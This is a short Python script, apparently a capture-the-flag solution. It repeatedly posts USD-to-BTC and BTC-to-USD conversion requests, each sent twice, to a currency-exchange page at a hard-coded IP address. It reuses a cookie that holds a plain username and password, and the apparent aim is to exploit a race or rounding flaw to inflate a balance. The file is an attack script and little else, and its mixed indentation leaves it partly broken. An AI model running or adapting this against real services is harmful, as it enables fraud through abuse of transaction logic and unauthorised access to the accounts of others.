import requests
import time

def brut():
    cookie="name=majid; password=majid"
    myheader = {'Cookie':cookie}
    num = 0.429827	
    for x in range(300):
	mydata = {'from_currency':'usd', 'to_currency':'btc', 'amount':num}
    	res = requests.post('http://95.179.148.72:8083/index.php' , headers=myheader , data=mydata ,allow_redirects=False)
    	res = requests.post('http://95.179.148.72:8083/index.php' , headers=myheader , data=mydata ,allow_redirects=False)
    	index3 = str(res.text).index('BTC: <b>')
    	index4 = str(res.text).index("</b><br>",25)
    	num = res.text[(index3+8):(index4)]
	print(mydata)
	print(num)
	time.sleep(1)
	#print(res.text)
    	mydata = {'from_currency':'btc', 'to_currency':'usd', 'amount':num}
    	res = requests.post('http://95.179.148.72:8083/index.php' , headers=myheader , data=mydata ,allow_redirects=False)
    	res = requests.post('http://95.179.148.72:8083/index.php' , headers=myheader , data=mydata ,allow_redirects=False)
    	index1 = str(res.text).index('<')
    	index2 = str(res.text).index('/')
    	num = res.text[(index1+3):(index2-1)]
	#print(res.text)
	print(mydata)
    	print(num)
if __name__ == '__main__':
	brut()

